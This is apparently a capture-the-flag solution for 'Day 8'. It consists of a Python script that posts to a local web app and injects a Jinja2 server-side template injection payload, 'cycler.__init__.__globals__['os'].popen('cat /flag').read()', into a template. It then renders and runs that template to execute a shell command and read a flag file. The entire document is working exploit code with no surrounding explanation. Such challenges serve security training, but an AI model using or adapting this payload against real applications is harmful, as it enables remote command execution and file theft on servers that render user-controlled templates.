# Day 8


### Solution

```py
import requests
import json


def make_post(url, payload):

    headers = {"Content-Type": "application/json"}

    response = requests.post(url, data=json.dumps(payload), headers=headers)

    return response.json()



resp = make_post("http://localhost/create", {"template":"robot.c.j2"})

url = f"http://localhost/tinker/{resp['toy_id']}"

payload = {
    "op": "replace",
        "index": 150,
        "length": 318,
        "content": "cycler.__init__.__globals__['os'].popen('cat /flag').read()[:-1] }}\");"
}

payload2 = {"op":"render"}
make_post(url, payload)
make_post(url, payload2)
res1 = make_post(f"http://localhost/assemble/{resp['toy_id']}", {})
print(res1)
resp = make_post(f"http://localhost/play/{resp['toy_id']}", {})

print(resp)
```
